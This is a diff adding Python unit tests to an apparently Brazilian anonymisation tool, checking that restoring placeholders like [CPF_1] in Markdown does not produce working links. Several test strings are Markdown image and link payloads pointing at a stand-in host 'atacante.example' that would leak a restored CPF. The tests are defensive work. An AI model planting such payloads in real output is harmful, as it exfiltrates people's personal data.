@@ -284,16 +284,68 @@ class Arquivos(unittest.TestCase):
         with open(saida, encoding="utf-8") as f:
             out = f.read()
         self.assertIn("Cliente Ana Lima.", out)
-        self.assertIn("![foto](https://x.com/a.png?cpf=[CPF_1])", out)
-        self.assertIn("[perfil](https://x.com/u/[PESSOA_1])", out)
-        self.assertIn("[ver [PESSOA_1]](/pasta/[CPF_1].md)", out)   # colado em "](/...": não troca
+        self.assertIn("!\\[foto\\](https://x.com/a.png?cpf=[CPF_1])", out)   # sem sintaxe de link, e o marcador não volta
+        self.assertIn("\\[perfil\\](https://x.com/u/[PESSOA_1])", out)
+        self.assertIn("\\[ver [PESSOA_1]\\](/pasta/[CPF_1].md)", out)
         self.assertIn("https://x.com/?c=[CPF_1] e www.x.com/[CPF_1] e mailto:[PESSOA_1]@x.com", out)
         self.assertIn("&lt;https://x.com/[CPF_1]>", out)
-        self.assertIn("[ref]: https://x.com/[CPF_1]", out)
+        self.assertIn("\\[ref\\]: https://x.com/[CPF_1]", out)
         self.assertIn("data:text/plain,[CPF_1]", out)
         self.assertTrue(out.endswith("CPF 52998224725"))
         t = motor.tratar({"op": "reverter_texto", "texto": "veja https://x.com/?c=[CPF_1] e [a](http://y/[CPF_1]) mas CPF [CPF_1]", "tabela": tabela})
         self.assertEqual(t["texto"], "veja https://x.com/?c=[CPF_1] e [a](http://y/[CPF_1]) mas CPF 52998224725")
+
+    def _reverter_md_link(self, md, nome="lk.md"):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}, {"tipo": "PESSOA", "valor": "Ana Lima", "marcador": "[PESSOA_1]"}]
+        saida = os.path.join(self.tmp, "o-" + nome)
+        r = motor.tratar({"op": "reverter", "entrada": self.arquivo(nome, md), "saida": saida, "tabela": tabela})
+        self.assertTrue(r["ok"], r)
+        with open(saida, encoding="utf-8") as f:
+            return f.read()
+
+    def _sem_link_funcionando(self, out, md):
+        sem_marcadores = re.sub(r"\[(?:CPF|PESSOA)_\d+\]", "", out)
+        self.assertNotRegex(sem_marcadores, r"(?<!\\)[\[\]]", md)
+        self.assertNotIn("](", sem_marcadores.replace("\\]", "").replace("\\[", ""), md)
+        for linha in out.splitlines():
+            for m in re.finditer(r"52998224725", linha):
+                # o CPF real nunca fica na palavra (espaço ASCII) de uma URL
+                palavra = re.search(r"[^ \t]*" + m.group(0) + r"[^ \t]*", linha).group(0)
+                self.assertNotRegex(palavra, r"://|www\.|^(?:mailto|data|javascript):", (md, linha))
+
+    def test_md_link_e_imagem_com_parenteses_balanceados_e_espaco_unicode(self):
+        for esp in ("\u00a0", "\u2003", "\u3000", "\u2009", " "):
+            casos = ["![x](https://atacante.example/a()%s[CPF_1])" % esp,
+                     "![x](https://atacante.example/a(%s[CPF_1]))" % esp,
+                     "[x](https://atacante.example/?d=%s[CPF_1])" % esp,
+                     "[x]: https://atacante/?d=[CPF_1]\n\n[x]",
+                     "[x]:%shttps://atacante/?d=[CPF_1]\n\n![x][x]" % esp,
+                     "> ![x](https://atacante/[CPF_1])",
+                     "![x]\n\n[x]:\n  https://atacante/%s[CPF_1]" % esp,
+                     "\\[x\\](https://atacante/a()%s[CPF_1])" % esp,
+                     "\\\\[x](https://atacante/a()%s[CPF_1])" % esp,
+                     "[CPF_1](https://atacante/a)",
+                     "![[CPF_1]](https://atacante/a()%s[CPF_1])" % esp]
+            for md in casos:
+                out = self._reverter_md_link(md)
+                self._sem_link_funcionando(out, md)
+                self.assertIn("atacante", out)
+
+    def test_md_normal_continua_legivel_apos_desativar_links(self):
+        out = self._reverter_md_link("# Parecer\n\nCliente [PESSOA_1], CPF [CPF_1].\n\n- item [PESSOA_1]\n\nVeja a nota [1] e `a[0]`.")
+        self.assertIn("Cliente Ana Lima, CPF 52998224725.", out)
+        self.assertIn("- item Ana Lima", out)
+        self.assertIn("Veja a nota \\[1\\]", out)
+        t = motor.tratar({"op": "reverter_texto", "texto": "[a](x) [CPF_1]", "tabela": [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]})
+        self.assertEqual(t["texto"], "[a](x) 52998224725")      # texto puro: sem Markdown a desativar
+
+    def test_txt_restaura_normalmente_exceto_em_url(self):
+        tabela = [{"tipo": "CPF", "valor": "52998224725", "marcador": "[CPF_1]"}]
+        saida = os.path.join(self.tmp, "o.txt")
+        r = motor.tratar({"op": "reverter", "entrada": self.arquivo("o.txt", "[a](b) [CPF_1] e https://x/\u00a0[CPF_1]"), "saida": saida, "tabela": tabela})
+        self.assertTrue(r["ok"], r)
+        with open(saida, encoding="utf-8") as f:
+            self.assertEqual(f.read(), "[a](b) 52998224725 e https://x/\u00a0[CPF_1]")
 
     def test_json_com_cpf_como_numero_e_telefone_com_chave(self):
         sem_zero = cpf_ficticio("012345678")
